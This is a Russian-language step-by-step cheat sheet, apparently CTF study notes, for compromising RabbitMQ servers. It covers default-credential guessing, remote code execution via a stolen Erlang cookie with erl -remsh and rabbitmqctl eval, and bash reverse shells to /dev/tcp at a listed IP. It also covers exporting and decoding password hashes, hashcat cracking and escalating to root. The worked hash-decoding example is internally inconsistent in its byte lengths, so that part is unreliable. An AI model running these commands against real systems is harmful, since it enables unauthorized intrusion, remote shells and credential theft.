# Конспект по эксплуатации RabbitMQ
## Введение

RabbitMQ — это брокер сообщений, работающий на Erlang. Его эксплуатация обычно идёт по трём основным направлениям: **дефолтные креды**, **уязвимости версий** и **доступ к Erlang cookie** для получения RCE. Ниже — пошаговый разбор каждого вектора.


## Шаг 1. Разведка портов

Сканируй целевой хост на следующие порты:

| Порт | Протокол | Что там |
|---|---|---|
| **4369** | TCP | EPMD (Erlang Port Mapper Daemon) |
| **5671/5672** | TCP | AMQP (основной протокол RabbitMQ) |
| **15672** | TCP | Management UI + HTTP API |
| **25672** | TCP | Erlang Distribution (межнодовое взаимодействие) |

**Команда:**
```bash
nmap -p 4369,5671,5672,15672,25672 -sV <target>
```


## Шаг 2. Проверка Management UI (порт 15672)

### 2.1. Дефолтные креды

RabbitMQ создаёт пользователя `guest:guest` по умолчанию, но **только для localhost** . Снаружи он обычно не работает.

Попробуй типичные комбинации:
- `admin:admin`
- `guest:guest`
- `administrator:administrator`

В CTF-задачах часто срабатывает `admin:admin` .

### 2.2. Что делать после входа

Зайдя в Management UI, проверь:
- **Queues** — сообщения в очередях могут содержать флаги или креды .
- **Users** — список пользователей и их теги.
- **Connections / Channels** — активные соединения.

**Через API:**
```bash
curl -u admin:admin http://<target>:15672/api/queues
curl -u admin:admin http://<target>:15672/api/users
```


## Шаг 3. Получение RCE через Erlang Cookie

### 3.1. Что такое Erlang cookie

RabbitMQ работает на Erlang VM. Узлы Erlang общаются между собой, используя **общий секрет** — **Erlang cookie**. Это строка из букв и цифр .

**Расположение:**
- `/var/lib/rabbitmq/.erlang.cookie` (по умолчанию)
- `$HOME/.erlang.cookie`

**Права:** `0600` (доступ только владельцу). Если права слабее — это уязвимость .

### 3.2. Получение cookie

Если у тебя уже есть доступ к файловой системе (LFI, RCE):
```bash
cat /var/lib/rabbitmq/.erlang.cookie
```

Или через чтение файла любым доступным способом.

### 3.3. Подключение к Erlang узлу

**Способ 1: через `erl -remsh`**

```bash
# Создай файл cookie в своём home
echo "ТВОЙ_COOKIE" > ~/.erlang.cookie
chmod 400 ~/.erlang.cookie

# Подключись к узлу
erl -sname attacker -setcookie ТВОЙ_COOKIE -remsh rabbit@forge
```

**Что здесь важно:**
- `-sname attacker` — **имя твоего узла**. Оно **НЕ ДОЛЖНО** совпадать с именем сервера (`rabbit@forge`). Если совпадёт — сервер отвергнет handshake (`sno` или `snok`) .
- `-remsh rabbit@forge` — имя **целевого узла**. Узнать можно из:
  - Имени лог-файла (`rabbit@forge.log`)
  - `epmd -names`
  - `/etc/hostname`

**Способ 2: через `rabbitmqctl`**

```bash
rabbitmqctl --node rabbit@forge eval 'os:cmd("id").'
```

### 3.4. Выполнение команд

В Erlang shell (`(rabbit@forge)1>`) выполни:

```erlang
os:cmd("id").
os:cmd("cat /etc/passwd").
os:cmd("bash -c 'bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1'").
```

**Важно:** двойные кавычки, точка в конце.

### 3.5. Reverse shell

На своей машине:
```bash
nc -lvnp 4444
```

В Erlang shell:
```erlang
os:cmd("bash -c 'bash -i >& /dev/tcp/192.168.135.182/4444 0>&1'").
```


## Шаг 4. Эскалация через хеш пароля RabbitMQ

### 4.1. Экспорт definitions

```bash
cd ~
echo "COOKIE" > ~/.erlang.cookie
chmod 400 ~/.erlang.cookie
rabbitmqctl --node rabbit@forge export_definitions /tmp/definitions.json
```

### 4.2. Анализ JSON

```bash
cat /tmp/definitions.json | grep -A 3 '"name": "root"'
```

Ты увидишь `password_hash` — **base64-строку**.

### 4.3. Как работает хеширование RabbitMQ

**Алгоритм RabbitMQ (SHA-256 по умолчанию):**

1. Генерируется **случайная соль** — **4 байта** .
2. Соль добавляется **в начало** пароля: `salted = salt + password`.
3. Вычисляется **SHA-256**: `hash = SHA256(salted)`.
4. В файл сохраняется: `base64(salt + hash)`.

**Формат `password_hash`:**
```
[соль: 4 байта][SHA-256 хеш: 32 байта]
```

### 4.4. Декодирование хеша

```bash
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
```

**Результат:**
```
295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

**Разбор:**
- **Первые 8 hex-символов** (`295d1d16`) = **соль** (4 байта).
- **Остальное** (`a2617df6...`) = **SHA-256 хеш**.

### 4.5. Почему хеш используется как пароль

**В некоторых задачах** разработчик допустил ошибку: он **использовал SHA-256 хеш как пароль системного root**. В `definitions.json` может быть **прямая подсказка**:

> «The password for the root user is the SHA-256 hashed value...»

**Пароль root** = **hex-строка после соли**:
```
a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

### 4.6. Получение root

```bash
su root
# Введи: a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```


## Шаг 5. Альтернатива: взлом хеша через hashcat

Если хеш **не является паролем напрямую**, его можно попробовать взломать.

**Подготовка:**
```bash
printf '%s' '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 128 | perl -pe 's/^(.{8})(.*)/$2:$1/' > hash.txt
```

**Взлом:**
```bash
hashcat -m 1420 --hex-salt hash.txt /usr/share/wordlists/rockyou.txt
```

`-m 1420` — режим для **salted SHA-256** .


## Шаг 6. Проверка уязвимостей версий

| CVE | Версии | Что делает |
|---|---|---|
| **CVE-2023-46118** | < 3.11.24, < 3.12.7 | DoS через большие HTTP-запросы  |

**Проверка версии:**
```bash
rabbitmqctl status | grep -i version
curl -u admin:admin http://<target>:15672/api/overview | grep rabbitmq_version
```


## Шаг 7. Чек-лист эксплуатации

- [ ] Nmap: порты 4369, 5672, 15672, 25672
- [ ] Management UI: дефолтные креды (`admin:admin`, `guest:guest`)
- [ ] Management UI: очереди на наличие флагов/кредов
- [ ] Erlang cookie: найден в `/var/lib/rabbitmq/.erlang.cookie`
- [ ] Erlang cookie: права слабее `0600`
- [ ] Подключение: `erl -sname attacker -setcookie COOKIE -remsh rabbit@HOST`
- [ ] RCE: `os:cmd("id")` в Erlang shell
- [ ] Reverse shell: `os:cmd("bash -c '...'")`
- [ ] `rabbitmqctl export_definitions` → хеш пароля
- [ ] Base64-декодирование хеша → hex
- [ ] Отбрасывание 4 байт соли → пароль
- [ ] `su root` с паролем
- [ ] Проверка CVE по версии


## Ключевые моменты для запоминания

1. **Erlang cookie — это ключ к RCE.** Если он доступен и права слабые — RabbitMQ скомпрометирован .
2. **Имя клиента ≠ имя сервера.** `attacker@host` vs `rabbit@host` — иначе handshake не пройдёт .
3. **Формат хеша RabbitMQ:** `base64(соль[4 байта] + SHA256(соль + пароль))` .
4. **Hashcat mode 1420** — для salted SHA-256 RabbitMQ .
5. **`rabbitmqctl eval 'os:cmd(...).'`** — прямая команда от имени rabbitmq.
6. **`erl -remsh`** — интерактивный Erlang shell на удалённом узле.


## Быстрые команды

```bash
# Разведка
nmap -p 4369,5672,15672,25672 -sV <target>

# Management UI
curl -u admin:admin http://<target>:15672/api/overview

# Erlang cookie
cat /var/lib/rabbitmq/.erlang.cookie

# Подключение
echo "COOKIE" > ~/.erlang.cookie && chmod 400 ~/.erlang.cookie
erl -sname attacker -setcookie COOKIE -remsh rabbit@HOST

# RCE
os:cmd("id").

# Экспорт definitions
rabbitmqctl --node rabbit@HOST export_definitions /tmp/definitions.json

# Декодирование хеша
echo -n 'BASE64_HASH' | base64 -d | xxd -p -c 100

# Взлом (если нужно)
hashcat -m 1420 --hex-salt hash.txt wordlist.txt
```